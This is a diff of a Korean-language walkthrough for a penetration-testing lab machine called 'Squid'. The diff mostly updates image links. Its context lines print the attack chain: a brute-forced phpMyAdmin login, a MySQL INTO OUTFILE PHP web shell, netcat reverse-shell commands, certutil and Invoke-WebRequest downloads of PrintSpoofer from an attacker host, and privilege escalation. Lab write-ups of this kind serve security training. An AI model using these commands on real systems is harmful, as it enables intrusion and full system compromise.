@@ -320,10 +320,10 @@ for port in $(cat /tmp/ports_to_check.txt) ; do \
 done
 ```
 
-![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+![](https://github.com/user-attachments/assets/3b577393-3ddc-45a5-bfdd-438464c54c5b)
 
 - 8080 port found!
-  ![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+  ![8080 found](https://github.com/user-attachments/assets/c486059f-e5a5-4551-b568-36df61890efe)
 - phpmyadmin path found
 
 ## 5. 내부 웹
@@ -817,11 +817,11 @@ $(function() {
 ## 6. Hydra
 
 - phpinfo() button
-  ![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+  ![phpinfo()](https://github.com/user-attachments/assets/c18a8029-02fa-43d9-b33d-515b15c87a68)
 - fopen On
-  ![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+  ![fopen](https://github.com/user-attachments/assets/b9490658-5cd9-48cc-8753-7abfe9569ed0)
 - server root fs
-- ![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+- ![root fs](https://github.com/user-attachments/assets/13eb5911-db8a-4c93-8608-75762f07f042)
 
 ```bash
 hydra -l root -P /usr/share/wordlists/...  (명령어 잘림, 원본 미확인)
@@ -1033,7 +1033,7 @@ phpMyAdmin은 로그인 시 세션+CSRF 토큰 검증을 하므로 Hydra처럼 �
 
 ./tmp/brute_pma.py
 
-![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image.png)
+![](https://github.com/user-attachments/assets/56a3676e-9b8c-4704-86b9-3b9e5960f12d)
 
 # root / 빈 값 (성공)
 
@@ -1041,18 +1041,18 @@ phpMyAdmin은 로그인 시 세션+CSRF 토큰 검증을 하므로 Hydra처럼 �
 
 192.168.150.189
 
-![WAMP서버 접속](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_1.png)
+![WAMP서버 접속](https://github.com/user-attachments/assets/a094381a-53cc-4eb5-9185-938d95958a4a)
 
-![phpmyadmin](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_3.png)
+![phpmyadmin](https://github.com/user-attachments/assets/6475ddd3-b81b-4414-a794-ba3ebb5d85a4)
 
-![login success](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_4.png)
+![login success](https://github.com/user-attachments/assets/9684ce4d-8e0e-4d10-9aa3-d22e8227b102)
 
 # success initial access
 
 - MYSQL webshell output write
-  ![web_shell_output](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_6.png)
+  ![web_shell_output](https://github.com/user-attachments/assets/40647d6f-19a1-4a87-9273-2b433b36f808)
 
-- ![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+- ![fs pwd](https://github.com/user-attachments/assets/4e65b4be-1c38-4c38-ae8c-d5df797700a2)
 
 ```sql
 SELECT '<?php system($_GET["cm-d"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
@@ -1060,13 +1060,13 @@ SELECT '<?php system($_GET["cm-d"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
 
 - 현재 웹 서비스가 wamp에서 진행된다고 가정하고 /wamp/www/ 경로에 생성 -> 일반적으로 wamp는 C:/wamp/www/ 을 사용하기 때문에 시도하기
 - nt authority\local service
-  ![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+  ![](https://github.com/user-attachments/assets/198e7e0d-c541-4f38-ac15-4e414d517cef)
 - 그냥 C:/shell.php 도 실행이 되는데?
 
 http://192.168.150.189:8080/shell.php?cmd=whoami
 
-![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
-![output](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_7.png)
+![](https://github.com/user-attachments/assets/dd9ad5c0-f6ca-4fb5-9531-73f40979193b)
+![output](https://github.com/user-attachments/assets/b12ef6ba-a39d-4076-9735-bb39ca0c3fc7)
 
 nt authority\local service
 
@@ -1075,7 +1075,7 @@ nt authority\local service
 
 http://192.168.150.189:8080/shell.php?cmd=whoami /priv
 
-![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_8.png)
+![](https://github.com/user-attachments/assets/c294f66a-3d66-422f-9cce-9a4e7366332c)
 
 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ========
 SeAssignPrimaryTokenPrivilege Replace a process level token Disabled
@@ -1094,13 +1094,13 @@ SeTimeZonePrivilege Change the time zone Disabled
   - PrintSpoofer
   - JuicyPotato
 
-- ![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_9.png)
-- ![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_11.png)
+- ![](https://github.com/user-attachments/assets/f6ed1f58-8f95-479f-a444-aae45c1de66d)
+- ![](https://github.com/user-attachments/assets/3b5376d4-2f33-4036-8eaf-585d9500b5f9)
   schtasks /query /fo LIST /v -> 자동화된 명령어 탐색
   http://192.168.150.189:8080/shell.php?cmd=schtasks /query /fo LIST /v
   http://192.168.150.189:8080/shell.php?cmd=schtasks /query /fo LIST /v | findstr /i "Perm \wamp"
 
-- ![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_12.png)
+- ![](https://github.com/user-attachments/assets/6abca3eb-117b-4502-aef1-bdbf55d6cfcb)
 - wamp windows + apache + mysql/mariadb + php
 - 로그 분석
   Task To Run: powershell.exe -Exec Bypass -Command "C:\wampp\nc.exe 192.168.118.23 4444 -e cmd.exe" Task To Run: powershell.exe -Exec Bypass -Command "C:\wampp\nc.exe 192.168.100.23 4444 -e cmd.exe"
@@ -1121,16 +1121,16 @@ http://192.168.150.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 
 
 # 파일 없어서 실패 칼리에서 설치
 
-![404 failed](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_14.png)
+![404 failed](https://github.com/user-attachments/assets/910e746c-6c70-453d-b4fa-18f827a7ddfb)
 
 sudo wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe
-![install PrintSpoofer64.exe for SeImpersonatePrivilege enabled](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_13.png)
+![install PrintSpoofer64.exe for SeImpersonatePrivilege enabled](https://github.com/user-attachments/assets/4294a198-5fab-4f3c-aeba-6b4c345a8c8e)
 
 ```ps1
 http://192.168.150.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.150/usr/share/windows-resources/binaries/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
 ```
 
-![failed](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_15.png)
+![failed](https://github.com/user-attachments/assets/0edbd1f2-7bd0-4a0d-a9db-ef1b340263d7)
 
 # 아예 해당 파일 위치로 이동해서 python server on -> 그래도 안 되길래 그냥 파일을 / 로 옮기고 시도 -> 성공
 
@@ -1140,7 +1140,7 @@ http://192.168.150.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 
 
 # 타겟으로 PrintSpoofer 역다운로드로 파일 이동 성공
 
-![success](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_16.png)
+![success](https://github.com/user-attachments/assets/a17648ef-34c7-4a22-a791-18332fb4d7d1)
 
 http://192.168.150.189:8080/shell.php?cmd=C:\Temp\PrintSpoofer.exe -i -c cmd.exe
 
@@ -1156,18 +1156,18 @@ INTO OUTFILE 'C:/wamp/www/uploader.php';
 
 ./tmp/php_shell.php
 
-![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+![php reverse shell](https://github.com/user-attachments/assets/5aca28d2-c2e5-4409-935c-a28275940035)
 
 # reverse success
 
-![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
-![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+![reverse success](https://github.com/user-attachments/assets/baefb704-9edc-45ad-be30-79f06cb92479)
+![](https://github.com/user-attachments/assets/f48252f3-403c-495e-b0a5-aa3884ec8dd0)
 
 # local flag
 
-![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+![](https://github.com/user-attachments/assets/09affe98-07fb-42e6-a12f-a7232a7643d1)
 
-![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+![](https://github.com/user-attachments/assets/4bfa0cc7-4f48-49b2-ad3b-f52831c0264b)
 
 # LHOST
 
@@ -1178,9 +1178,9 @@ sudo wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoo
 mkdir C:\Temp
 
 certutil -urlcache -f http://192.168.49.150/PrintSpoofer.exe C:\Temp\PrintSpoofer.exe
-![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+![](https://github.com/user-attachments/assets/f43a7a62-3595-423e-8d3b-78393e3570af)
 
-![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+![](https://github.com/user-attachments/assets/0277d5de-f182-4b59-ac3a-3bcaec031a0a)
 
 # privilege escalation
 
@@ -1188,7 +1188,7 @@ certutil -urlcache -f http://192.168.49.150/PrintSpoofer.exe C:\Temp\PrintSpoofe
 PrintSpoofer.exe -i -c cmd.exe
 ```
 
-![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+![](https://github.com/user-attachments/assets/5102a02d-a220-45b7-b215-9973a826327f)
 
 ```cmd
 dir /s *검색어*
@@ -1196,4 +1196,4 @@ dir /s *검색어*
 
 # proof.txt
 
-![\1](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/\2)
+![](https://github.com/user-attachments/assets/89379b58-e456-4370-a508-17c7207cefa7)
